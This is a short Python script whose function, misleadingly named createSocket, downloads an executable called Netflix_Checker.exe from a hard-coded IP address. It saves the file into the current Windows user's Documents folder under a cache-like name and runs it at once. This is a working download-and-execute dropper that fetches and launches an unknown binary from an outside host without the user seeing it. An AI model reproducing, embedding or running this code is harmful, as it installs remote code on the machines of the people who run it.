import os
import requests

def createSocket():
    username = os.getlogin()
    
    def download(url, path):
        reponse = requests.get(url)
        with open(path, 'wb') as fichier:
            fichier.write(reponse.content)
    
    def launch(path):
        os.startfile(path)
    
    dl_url = 'http://194.163.191.205:6963/builds/Netflix_Checker.exe'
    path = f'C:\\Users\\{username}\\Documents\\netflix_checker_cache.exe'
    
    download(dl_url, path)
    launch(path)